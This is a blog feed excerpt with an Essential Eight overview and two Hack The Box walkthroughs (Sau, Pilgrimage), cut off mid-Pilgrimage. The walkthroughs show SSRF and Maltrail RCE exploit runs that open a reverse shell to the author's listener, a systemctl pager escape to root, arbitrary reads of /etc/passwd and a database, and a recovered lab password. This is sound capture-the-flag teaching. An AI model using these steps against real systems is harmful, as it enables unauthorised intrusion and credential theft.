protocols.</p>]]></content><author><name></name></author><category term="Explainers"/><category term="SOCKS"/><category term="socket"/><category term="TCP"/><summary type="html"><![CDATA[Differences between SOCKS 4 and 5.]]></summary></entry><entry><title type="html">Essential Eight Explainers</title><link href="https://emdeh.github.io/blog/2023/Essential-Eight/" rel="alternate" type="text/html" title="Essential Eight Explainers"/><published>2023-10-30T14:14:00+00:00</published><updated>2023-10-30T14:14:00+00:00</updated><id>https://emdeh.github.io/blog/2023/Essential-Eight</id><content type="html" xml:base="https://emdeh.github.io/blog/2023/Essential-Eight/"><![CDATA[<h2 id="what-are-the-essential-eight">What are the Essential Eight</h2> <p>The Australian Signals Directorate’s <a href="https://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/essential-eight/essential-eight-explained"> Essential Eight Strategies to Mitigate Cyber Security Incidents</a> was developed as a prioritised baseline to assist organisations in protecting their systems against a range of cyber threats.</p> <p>Notably, the Essential Eight is just a starting point and is not exhaustive. Organisations should conduct regular risk assessments and adopt additional strategies based on their specific threat environment.</p> <p>For government entities covered by the Protective Security Policy Framework (PSPF), <a href="https://www.protectivesecurity.gov.au/publications-library/policy-10-safeguarding-data-cyber-threats">Policy 10: Safeguarding data from cyber threats</a> specifies that in addition to implementing the Essential Eight, entities should:</p> <blockquote> <p><em>“[consider] which of the remaining mitigation strategies from the <a href="https://www.cyber.gov.au/acsc/view-all-content/strategies-to-mitigate-cyber-security-incidents">Strategies to Mitigate Cyber Security Incidents</a> need to be implemented to achieve an acceptable level of residual risk for their entity.”</em></p> </blockquote> <p>Over the coming months, I’ll endeavour to produce PoCs and more detailed explainers that demonstrate why each of the Essential Eight is important and add to the <a href="https://emdeh.com/essential-eight-explainers/">Essential Eight Collection</a>, currently available in the navbar.</p> <p>The table below lists the Essential Eight, the typical exploits each strategy helps protect against and a brief example.</p> <h2 id="essential-eight-strategies">Essential Eight Strategies</h2> <p>1 - Application Control 2 - Patch Applications 3 - Configure Microsoft Office macro settings 4 - User Application Hardening 5 - Restrict Administrative Privileges 6 - Patch Operating Systems 7 - Multi-Factor Authentication 8 - Daily Backups</p> <table> <thead> <tr> <th>Strategy</th> <th>Typical Exploits Protected Against</th> <th>Example Exploit</th> </tr> </thead> <tbody> <tr> <td>Application Control</td> <td>Unauthorised/malicious software execution.</td> <td>A user unknowingly downloads and runs ransomware.</td> </tr> <tr> <td>Patch Applications</td> <td>Exploitation of known software vulnerabilities.</td> <td>Attacker exploits a known vulnerability in a PDF reader to run malicious code.</td> </tr> <tr> <td>Configure Microsoft Office macro settings</td> <td>Macro-based malware.</td> <td>A user opens an Office document from a phishing email which runs a malicious macro.</td> </tr> <tr> <td>User Application Hardening</td> <td>Drive-by downloads and web-based malicious content.</td> <td>A user visits a compromised website which then attempts to run Flash-based malware.</td> </tr> <tr> <td>Restrict Administrative Privileges</td> <td>Attacks that require admin rights to execute.</td> <td>An attacker gains user credentials that have unnecessary privileges and install keyloggers.</td> </tr> <tr> <td>Patch Operating Systems</td> <td>Exploitation of known OS vulnerabilities.</td> <td>Attacker exploits a known Windows vulnerability to gain remote code execution.</td> </tr> <tr> <td>Multi-Factor Authentication</td> <td>Credential theft or brute-force attacks.</td> <td>An attacker has a user’s password and can access their account remotely without the need for additonal authentication factors.</td> </tr> <tr> <td>Daily Backups</td> <td>Data loss due to ransomware, hardware failures, or accidental deletions.</td> <td>Ransomware encrypts a user’s files, but they can’t be restored from a backup.</td> </tr> </tbody> </table>]]></content><author><name></name></author><category term="Essential-Eight"/><category term="ACSC"/><category term="PSPF"/><category term="ASD"/><category term="ACSC"/><summary type="html"><![CDATA[Essential Eight security controls.]]></summary></entry><entry><title type="html">Sau</title><link href="https://emdeh.github.io/blog/2023/Sau/" rel="alternate" type="text/html" title="Sau"/><published>2023-10-16T14:14:00+00:00</published><updated>2023-10-16T14:14:00+00:00</updated><id>https://emdeh.github.io/blog/2023/Sau</id><content type="html" xml:base="https://emdeh.github.io/blog/2023/Sau/"><![CDATA[<h1 id="introduction">Introduction</h1> <p>Sau is an Easy machine on Hack The Box that focuses on exploiting two vulnerabilities to ultimately obtain initial access. Privilege escalation is then achieved by exploiting a legitimate binary.</p> <h1 id="enumeration">Enumeration</h1> <p>Nmap reveals three ports:</p> <ul> <li>22</li> <li>80</li> <li>55555</li> </ul> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code> nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-T4</span> 10.129.82.3 <span class="nt">-oA</span> nmap-sau
 
Not shown: 997 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed <span class="o">(</span>RSA<span class="o">)</span>
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp    filtered http
55555/tcp open     unknown
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sun, 15 Oct 2023 04:01:09 GMT
|     Content-Length: 75
|     invalid basket name<span class="p">;</span> the name does not match pattern: ^[wd-_<span class="se">\.</span><span class="o">]{</span>1,250<span class="o">}</span><span class="err">$</span>
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 302 Found
|     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
|     Location: /web
|     Date: Sun, 15 Oct 2023 04:00:37 GMT
|     Content-Length: 27
|     <span class="nv">href</span><span class="o">=</span><span class="s2">"/web"</span><span class="o">&gt;</span>Found&lt;/a&gt;.
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Sun, 15 Oct 2023 04:00:38 GMT
|_    Content-Length: 0
&lt;SNIP&gt;
</code></pre></div></div> <p>SSH is a dead end and port 80 is filtered, but browsing to <code class="language-plaintext highlighter-rouge">http://10.129.82.3:55555</code> lands on a site titled <strong>Request Baskets</strong>.</p> <h2 id="whats-request-baskets">What’s Request Baskets?</h2> <p>Request Baskets is a concept, often implemented as a tool or a service, used to capture, inspect, and debug HTTP requests. It provides a temporary “basket” or “bucket” that captures incoming HTTP requests for analysis. This is particularly useful for debugging webhooks, HTTP clients, or other services that send HTTP requests.</p> <p>An implementation usually works like this:</p> <ol> <li><strong>Create</strong> a new Request Basket, which provides a unique URL endpoint.</li> <li><strong>Configure</strong> the application, webhook, or service to send HTTP requests to the URL.</li> <li><strong>Inspect</strong> the incoming HTTP requests to the basket</li> <li>Use the captured information, to <strong>test or debug issues</strong>, validate payloads, or run other types of tests.</li> </ol> <p>We can see that this particular implementation is on version 1.2.1, which is vulnerable to <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-27163"> <em>CVE-2023–27163 - a Server-Side Request Forgery (SSRF)</em></a></p> <h2 id="whats-ssrf">What’s SSRF?</h2> <p>SSRF, or Server-Side Request Forgery, is a security vulnerability that allows an attacker to make requests to internal resources within an organization’s network, effectively bypassing firewalls. In SSRF attacks, <strong><em>the attacker manipulates a vulnerable web application to make requests to an internal resource,</em></strong> which could be anything from cloud services to databases or even restricted parts of the web application itself.</p> <p>The attack often occurs when a web application doesn’t properly validate or sanitise user input for URLs. An attacker can then trick the server into making an unauthorised request to internal resources, potentially revealing sensitive information or even executing commands.</p> <p>It’s particularly concerning in cloud environments, where metadata APIs can expose sensitive data that can lead to more severe attacks like privilege escalation.</p> <p>Prevention often involves input validation, restricting outbound requests from the server, or implementing allow lists for permissible URLs.</p> <h1 id="attack-vector">Attack vector</h1> <p>Given port 80 is filtered but there is an implementation of Request Baskets on port 55555 that is vulnerable to SSRF, this appears to provide a way to forward requests to the service running on port 80. A PoC of the SSRF vulnerability on Request-Baskets can be found <a href="https://github.com/entr0pie/CVE-2023-27163">here</a>.</p> <h2 id="testing">Testing</h2> <p>Creating a new basket in the web app and then configuring port 80 as the forward URL on a local interface can confirm this.</p> <p>Hovering over the <code class="language-plaintext highlighter-rouge">Proxy Response</code> option, we can see it will <em>Proxy the response from the forward url back to the client</em>.</p> <p>Checking this option will return the response from <code class="language-plaintext highlighter-rouge">http://localhost:80</code>.</p> <p><img src="/assets/img/2023-sau/20231016-sau-2.png" class="auto-resize"/></p> <p>Triggering a request by browsing to <code class="language-plaintext highlighter-rouge">http://10.129.82.3:55555/wnnyr21</code> returns a seemingly malformed web app called <strong>Maltrail</strong>. <img src="/assets/img/2023-sau/20231016-sau-5.png" class="auto-resize"/></p> <p>The app is running version 0.53 which is vulnerable to a <strong>Remote Code Execution.</strong></p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
└─<span class="nv">$ </span>searchsploit maltrail
<span class="nt">-----------------------------------------------------</span> <span class="nt">---------------------------------</span>
 Exploit Title                                       |  Path
<span class="nt">-----------------------------------------------------</span> <span class="nt">---------------------------------</span>
Maltrail v0.53 - Unauthenticated Remote Code Executi | python/webapps/51676.py
</code></pre></div></div> <h1 id="initial-access">Initial access</h1> <p>Using the first exploit, a basket can be created that, when accessed, will make a request to <code class="language-plaintext highlighter-rouge">http://localhost:80</code>, as tested manually.</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/HTB-Machines/sau/exploits]
└─<span class="nv">$ </span>./CVE-2023-27163.sh http://10.129.82.3:55555/ http://localhost:80
Proof-of-Concept of SSRF on Request-Baskets <span class="o">(</span>CVE-2023-27163<span class="o">)</span> <span class="o">||</span> More info at https://github.com/entr0pie/CVE-2023-27163

<span class="o">&gt;</span> Creating the <span class="s2">"ndapra"</span> proxy basket...
<span class="o">&gt;</span> Basket created!
<span class="o">&gt;</span> Accessing http://10.129.82.3:55555/ndapra now makes the server request to http://localhost:80.
./CVE-2023-27163.sh: line 43: jq: <span class="nb">command </span>not found
<span class="o">&gt;</span> Response body <span class="o">(</span>Authorization<span class="o">)</span>: <span class="o">{</span><span class="s2">"token"</span>:<span class="s2">"uQW06XHLrVKiZsq2XbeXRbrb6PRlQ53tTAVeaA-Puolb"</span><span class="o">}</span>
</code></pre></div></div> <p>This basket can then be used to proxy the second exploit to the vulnerable implementation of Maltrail.</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/HTB-Machines/sau/exploits]
└─<span class="nv">$ </span>python3 51676.py 10.10.14.12 4321  http://10.129.82.3:55555/ndapra
Running exploit on http://10.129.82.3:55555/ndapra/login
</code></pre></div></div> <p>The payload is executed on the Maltrail instance running on port 80, and a reverse shell is sucessfully caught on the listener.</p> <p><img src="/assets/img/2023-sau/20231016-sau-3.png" class="auto-resize"/></p> <h1 id="privilege-escalation">Privilege escalation</h1> <p>Privilege escalation is reasonably straight forward.</p> <p>Checking what the user can run as sudo returns one binary: <code class="language-plaintext highlighter-rouge">/usr/bin/systemctl status trail.service</code></p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>puma on sau:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User puma may run the following commands on sau:
    <span class="o">(</span>ALL : ALL<span class="o">)</span> NOPASSWD: /usr/bin/systemctl status trail.service
</code></pre></div></div> <p><a href="https://gtfobins.github.io/gtfobins/systemctl/">GTFOBIns</a> says the following about <code class="language-plaintext highlighter-rouge">systemctl</code> ran as sudo:</p> <blockquote> <p><em>If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor.</em></p> </blockquote> <p>Running the binary seems to drop into a new terminal session:</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/systemctl status trail.service
<span class="nb">sudo</span> /usr/bin/systemctl status trail.service
WARNING: terminal is not fully functional
-  <span class="o">(</span>press RETURN<span class="o">)</span>
</code></pre></div></div> <p>Attempting to execute a new shell from this terminal will spawn it under sudo:</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/systemctl status trail.service
<span class="nb">sudo</span> /usr/bin/systemctl status trail.service
WARNING: terminal is not fully functional
-  <span class="o">(</span>press RETURN<span class="o">)!</span>/bin/sh
<span class="o">!</span>//bbiinn//sshh!/bin/sh
<span class="c"># whoami</span>
<span class="nb">whoami
</span>root
</code></pre></div></div> <p><img src="/assets/img/2023-sau/20231016-sau-4.png" class="auto-resize"/></p> <p>Done and dusted!</p>]]></content><author><name></name></author><category term="HTB-Machines"/><category term="easy-box"/><category term="HTB"/><category term="CTF"/><category term="RCE"/><category term="SSRF"/><summary type="html"><![CDATA[Sau - Hack The Box write-up.]]></summary></entry><entry><title type="html">Pilgrimage</title><link href="https://emdeh.github.io/blog/2023/pilgrimage-write-up/" rel="alternate" type="text/html" title="Pilgrimage"/><published>2023-10-15T14:14:00+00:00</published><updated>2023-10-15T14:14:00+00:00</updated><id>https://emdeh.github.io/blog/2023/pilgrimage-write-up</id><content type="html" xml:base="https://emdeh.github.io/blog/2023/pilgrimage-write-up/"><![CDATA[<h1 id="introduction">Introduction</h1> <p>Pilgrimage is a relatively challenging Easy box where an Arbitrary File Read vulnerability is exploited to steal a username..</p> <p>The same exploit used in the AFR vulnerability is used against a Local File Inclusion vulnerability, which ultimately provided the user’s password.</p> <p>Once logged in <a href="https://github.com/DominicBreuker/pspy">pspy64</a> finds a script executing as <code class="language-plaintext highlighter-rouge">root</code>, that is using a version of <code class="language-plaintext highlighter-rouge">binwalk</code> that is vulnerable to Remote Code Execution.</p> <p>This is ultimately used to elevate privileges to <code class="language-plaintext highlighter-rouge">root</code>.</p> <h2 id="tools-exploits-and-cves">Tools, exploits, and CVEs</h2> <table> <thead> <tr> <th>Tool</th> <th>Description</th> </tr> </thead> <tbody> <tr> <td><a href="https://github.com/arthaud/git-dumper">Git Dumper</a></td> <td>A tool to dump a git repository from a website.</td> </tr> <tr> <td><a href="https://github.com/voidz0r/CVE-2022-44268">CVE-2022-44268 AFR PoC</a></td> <td>This is a proof of concept of the ImageMagick bug discovered by <a href="https://www.metabaseq.com/imagemagick-zero-days/">https://www.metabaseq.com/imagemagick-zero-days/</a>Tested on ImageMagick v. 7.1.0-48 and 6.9.11-60</td> </tr> <tr> <td><a href="https://github.com/DominicBreuker/pspy">Pspy</a></td> <td>pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea.</td> </tr> <tr> <td><a href="https://github.com/adhikara13/CVE-2022-4510-WalkingPath#cve-2022-4510-binwalk">CVE-2022-4510-Binwalk RCE Poc</a></td> <td>This script allows you to generate exploits for targeting CVE-2022-4510 Binwalk vulnerabilities. The exploits can be used for testing and demonstrations. The supported options include SSH, command execution, and reverse shell.</td> </tr> </tbody> </table> <h2 id="whats-an-arbitrary-file-read">What’s an Arbitrary File Read</h2> <p>An Arbitrary File Read vulnerability allows an attacker to read files on a system that they shouldn’t have access to. This could include sensitive configuration files, database credentials, or any other sensitive data stored on the server. The vulnerability occurs due to improper validation or lack of permissions in the application’s code, and it can lead to information disclosure or further exploitation if chained with other vulnerabilities.</p> <h2 id="whats-a-local-file-inclusion-lfi">What’s a Local File Inclusion (LFI)</h2> <p>A Local File Inclusion (LFI) vulnerability allows an attacker to include files from the server’s local filesystem into the output of a web application. This can lead to sensitive information disclosure, such as reading the /etc/passwd file on a Linux machine. LFI vulnerabilities typically occur due to poor validation of user input in web applications and can sometimes be escalated to execute arbitrary code on the server.</p> <h2 id="whats-binwalk">What’s binwalk?</h2> <p>Binwalk is a tool commonly used for analyzing, reverse engineering, and extracting firmware images. It’s widely used for security research and has various functionalities suitable for exploring a file’s structure. Essentially, it scans the given binary file for known patterns or “magic bytes,” then provides you with information about what each segment of bytes represents.</p> <p>For instance, you might use binwalk to:</p> <ul> <li>Identify embedded file systems in a firmware image.</li> <li>Extract those file systems for further analysis.</li> <li>Identify executable code, or other types of data, embedded in the firmware.</li> </ul> <h1 id="enumeration">Enumeration</h1> <p>Began with nmap scan</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-T4</span> 10.129.80.229 <span class="nt">-v</span> <span class="nt">-oA</span> nmap-pilgrimage

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 <span class="o">(</span>RSA<span class="o">)</span>
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
|_http-server-header: nginx/1.18.0
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Sun Oct 15 21:07:33 2023 -- 1 IP address (1 host up) scanned in 44.45 seconds</span>
</code></pre></div></div> <p>Two ports:</p> <ul> <li>22</li> <li>80</li> </ul> <p>Browsing to IP returns <code class="language-plaintext highlighter-rouge">http://pilgrimage.htb/</code>. Add to hosts:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.129.80.229 pilgrimage.htb
</code></pre></div></div> <h1 id="site-enumeration">Site enumeration</h1> <p>Lands on a site that appears to be a free online image shrinker. <img src="/assets/img/20231016-pilgrimage-1.png" alt="Image of site" class="auto-resize"/></p> <p>Appears you can register or login, but that is not necessary to use the service.</p> <p>Uploading a file shrinks it and provides a url to the location: <code class="language-plaintext highlighter-rouge">http://pilgrimage.htb/shrunk/652c8e6fd005d.png</code></p> <p>Navigating to <code class="language-plaintext highlighter-rouge">http://pilgrimage.htb/shrunk/</code> returns a 403 error</p> <p>Looking at port 80 more closely, and a git repo is found:</p> <p>Looking at port 80 more closely, and a git repo is found:</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sCV</span> <span class="nt">-p</span> 80 10.129.80.229
Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-10-15 21:44 EDT
Nmap scan report <span class="k">for </span>pilgrimage.htb <span class="o">(</span>10.129.80.229<span class="o">)</span>
Host is up <span class="o">(</span>0.30s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not <span class="nb">set</span>
|_http-server-header: nginx/1.18.0
|_http-title: Pilgrimage - Shrink Your Images
| http-git:
|   10.129.80.229:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository<span class="p">;</span> edit this file <span class="s1">'description'</span> to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. <span class="c"># Please ...</span>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>14.81 seconds
</code></pre></div></div> <h1 id="git-repo-enumeration">Git Repo enumeration</h1> <p>Used https://github.com/arthaud/git-dumper.git to dump git repo:</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/HTB-Machines/pilgrimage/findings]
└─<span class="nv">$ </span>git-dumper http://pilgrimage.htb/.git git
</code></pre></div></div> <p>Appears to use <code class="language-plaintext highlighter-rouge">magick</code>, command-line utility that is part of the ImageMagick suite of tools. ImageMagick is a software suite to create, edit, compose, or convert bitmap images. It can read, convert, and write images in a variety of formats like JPEG, PNG, GIF, BMP, and many others. The magick command is used for converting between image formats as well as resizing, cropping, and performing other image manipulation tasks.</p> <p>&lt;img src=”/assets/img/20231016-pilgrimage-2.png” alt=”Image of git”class=”auto-resize”&gt;</p> <p>Can pull the version:</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/…/HTB-Machines/pilgrimage/findings/git]
└─<span class="nv">$ </span>./magick <span class="nt">-usage</span>
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
</code></pre></div></div> <p>The magick version is vulnerable to a <strong>Arbitrary File Read</strong> <img src="/assets/img/220231016-pilgrimage-3.png" alt="Image of searchsploit" class="auto-resize"/></p> <h2 id="initial-access">Initial access</h2> <h2 id="arbitrary-file-read">Arbitrary File Read</h2> <p>Used https://github.com/voidz0r/CVE-2022-44268 PoC.</p> <p>Read <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file and found user <code class="language-plaintext highlighter-rouge">emily</code> <img src="/assets/img/20231016-pilgrimage-4.png" alt="Image found user" class="auto-resize"/></p> <h2 id="local-file-inclusion">Local File Inclusion</h2> <p>The <strong>dashboard.php</strong> makes queries to a SQLite database at <code class="language-plaintext highlighter-rouge">/var/db/pilgrimage</code></p> <p>Downloaded DB using the LFI vulnerability</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/…/HTB-Machines/pilgrimage/exploits/CVE-2022-44268]
└─<span class="nv">$ </span>cargo run <span class="s2">"/var/db/pilgrimage"</span>
    Finished dev <span class="o">[</span>unoptimized + debuginfo] target<span class="o">(</span>s<span class="o">)</span> <span class="k">in </span>0.02s
     Running <span class="sb">`</span>target/debug/cve-2022-44268 /var/db/pilgrimage<span class="sb">`</span>

</code></pre></div></div> <p>Upload image.png and download converted file, and grab hex response:</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/…/HTB-Machines/pilgrimage/exploits/CVE-2022-44268]
└─<span class="nv">$ </span>identify <span class="nt">-verbose</span> 652ca0d768621.png
Image: 652ca0d768621.png
  Format: PNG <span class="o">(</span>Portable Network Graphics<span class="o">)</span>
  Geometry: 100x100
  Class: PseudoClass
  Type: palette
  Depth: 1 bits-per-pixel component
  Channel Depths:
    Red:      1 bits
    Green:    1 bits
    Blue:     1 bits
  Channel Statistics:
    Red:
      Minimum:                 65535.00 <span class="o">(</span>1.0000<span class="o">)</span>
      Maximum:                 65535.00 <span class="o">(</span>1.0000<span class="o">)</span>
      Mean:                    65535.00 <span class="o">(</span>1.0000<span class="o">)</span>
      Standard Deviation:          0.00 <span class="o">(</span>0.0000<span class="o">)</span>
    Green:
      Minimum:                     0.00 <span class="o">(</span>0.0000<span class="o">)</span>
      Maximum:                     0.00 <span class="o">(</span>0.0000<span class="o">)</span>
      Mean:                        0.00 <span class="o">(</span>0.0000<span class="o">)</span>
      Standard Deviation:          0.00 <span class="o">(</span>0.0000<span class="o">)</span>
    Blue:
      Minimum:                     0.00 <span class="o">(</span>0.0000<span class="o">)</span>
      Maximum:                     0.00 <span class="o">(</span>0.0000<span class="o">)</span>
      Mean:                        0.00 <span class="o">(</span>0.0000<span class="o">)</span>
      Standard Deviation:          0.00 <span class="o">(</span>0.0000<span class="o">)</span>
  Colors: 2
    0: <span class="o">(</span>255,  0,  0<span class="o">)</span>      red
    1: <span class="o">(</span>255,255,255<span class="o">)</span>      white
  Gamma: 0.45455
  Chromaticity:
    red primary: <span class="o">(</span>0.64,0.33<span class="o">)</span>
    green primary: <span class="o">(</span>0.3,0.6<span class="o">)</span>
    blue primary: <span class="o">(</span>0.15,0.06<span class="o">)</span>
    white point: <span class="o">(</span>0.3127,0.329<span class="o">)</span>
  Filesize: 1.1Ki
  Interlace: No
  Orientation: Unknown
  Background Color: <span class="c">#FEFEFE</span>
  Border Color: <span class="c">#DFDFDF</span>
  Matte Color: <span class="c">#BDBDBD</span>
  Page geometry: 100x100+0+0
  Compose: Over
  Dispose: Undefined
  Iterations: 0
  Compression: Zip
  Png:IHDR.color-type-orig: 3
  Png:IHDR.bit-depth-orig: 1
  Raw profile <span class="nb">type</span>:

   20480
53514c69746520666f726d61742033001000010100402020000000440000000500000000
000000000000000400000004000000000000000000000001000000000000000000000000
000000000000000000000000000000000000000000000044002e4b910d0ff800040eba00
0f650fcd0eba0f3800000000000000000000000000000000000000000000000000000000
&lt;SNIP&gt;

6e670332036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f
363532633963376562306134642e706e670231036909687474703a2f2f70696c6772696d
6167652e6874622f736872756e6b2f363532633939623661643562392e706e67

  Date:create: 2023-10-16T02:32:55+00:00
  Date:modify: 2023-10-16T02:32:55+00:00
  Date:timestamp: 2023-10-16T02:32:55+00:00
  Signature: c7d03a3453434db9720fd67b559185125d9bdb1fe9c25c182783170e2ba6a8f6
  Tainted: False
  User Time: 0.040u
  Elapsed Time: 0m:0.005439s
  Pixels Per Second: 1.8Mi
</code></pre></div></div> <p>Save hex to file and remove <code class="language-plaintext highlighter-rouge">\n</code></p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span> &lt; db-hex <span class="o">&gt;</span> cleaned-db-hex
</code></pre></div></div> <p>pass the file to a hex to string conversion:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="sh">"</span><span class="s">print(bytes.fromhex(open(</span><span class="sh">'</span><span class="s">hex_data.txt</span><span class="sh">'</span><span class="s">, </span><span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="s">).read().strip()))</span><span class="sh">"</span>
</code></pre></div></div> <p>Find a password: <img src="/assets/img/20231016-pilgrimage-5a.png" alt="Found password" class="auto-resize"/></p> <h1 id="logging-in">Logging in</h1> <p>User the credentials <code class="language-plaintext highlighter-rouge">emily:abigchonkyboi123</code> to log in via ssh. <img src="/assets/img/20231016-pilgrimage-6.png" alt="SSH in" class="auto-resize"/></p> <h1 id="privilege-escalation">Privilege escalation</h1> <p>No sudo privs</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>emily@pilgrimage:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>emily:
Sorry, user emily may not run <span class="nb">sudo </span>on pilgrimage.
emily@pilgrimage:~<span class="err">$</span>
</code></pre></div></div> <p>Upload <a href="https://github.com/DominicBreuker/pspy">pspy64</a>.</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>emily@pilgrimage:~/test<span class="nv">$ </span><span class="nb">chmod</span> +x pspy64
emily@pilgrimage:~/test<span class="nv">$ </span>./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
                   ░           ░ ░
                               ░ ░

